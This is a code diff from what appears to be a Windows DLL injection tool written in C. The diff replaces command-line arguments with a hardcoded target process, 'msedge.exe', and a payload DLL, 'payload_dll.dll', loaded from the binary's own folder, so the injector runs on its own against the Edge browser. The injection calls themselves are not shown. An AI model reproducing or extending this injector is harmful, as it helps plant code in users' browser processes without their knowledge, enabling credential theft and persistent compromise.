@@ -109,26 +109,28 @@ _EndOfFunction:
 
 }
 
-int main(int argc, char* argv[]) {
+int main() {
 
-	// Get Command Line Arguments
-	if (argc < 3) {
-		printf("[!] Missing Argument; Usage: <Complete Path to Dll File> <Target Process Name>\n");
+	// Hardcoded process name
+	wchar_t szProcessName[] = L"msedge.exe";
+
+	// Get the current location of the binary
+	wchar_t szCurrentPath[MAX_PATH];
+	DWORD length = GetModuleFileName(NULL, szCurrentPath, MAX_PATH);
+	if (length == 0) {
+		printf("[!] GetModuleFileName Failed With Error Code: %d\n", GetLastError());
 		return -1;
 	}
 
+	// Remove the executable name from the path
+	wchar_t* lastSlash = wcsrchr(szCurrentPath, L'\\');
+	if (lastSlash != NULL) {
+		*lastSlash = L'\0';
+	}
 
-	printf("[*] Using Dll Payload: %s\n", argv[1]);
-	printf("[*] Target Process Name: %s\n", argv[2]);
-
-	// Convert command line arguments to wide strings
+	// Append the DLL name to the path
 	wchar_t szDllPath[MAX_PATH];
-	size_t convertedChars = 0;
-	mbstowcs_s(&convertedChars, szDllPath, MAX_PATH, argv[1], _TRUNCATE);
-
-	wchar_t szProcessName[MAX_PATH];
-	mbstowcs_s(&convertedChars, szProcessName, MAX_PATH, argv[2], _TRUNCATE);
-
+	swprintf(szDllPath, MAX_PATH, L"%s\\payload_dll.dll", szCurrentPath);
 
 	DWORD dwProcessID;
 	HANDLE hProcess;
